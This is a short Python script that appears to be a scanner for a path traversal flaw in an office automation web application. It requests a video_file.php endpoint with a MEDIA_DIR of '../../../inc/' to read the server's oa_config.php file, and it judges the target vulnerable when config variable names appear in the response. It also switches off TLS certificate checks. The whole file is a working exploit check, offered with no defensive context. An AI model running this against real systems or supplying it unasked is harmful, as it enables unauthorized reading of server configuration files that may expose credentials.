import requests,re,urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def scan(baseurl):
	if baseurl[-1]=="/":
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"general/mytable/intel_view/video_file.php?MEDIA_DIR=../../../inc/&MEDIA_NAME=oa_config.php"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and "$OFFLINE_TIME_MIN=" in response.text and "$ATTACH_LOCK_REF_SEC=" in response.text and "$ONLINE_REF_SEC=" in response.text and "$STATUS_REF_SEC=" in response.text:
		r0=True
	else:
		r0=False
	if r0:
		return True
	else:
		return False
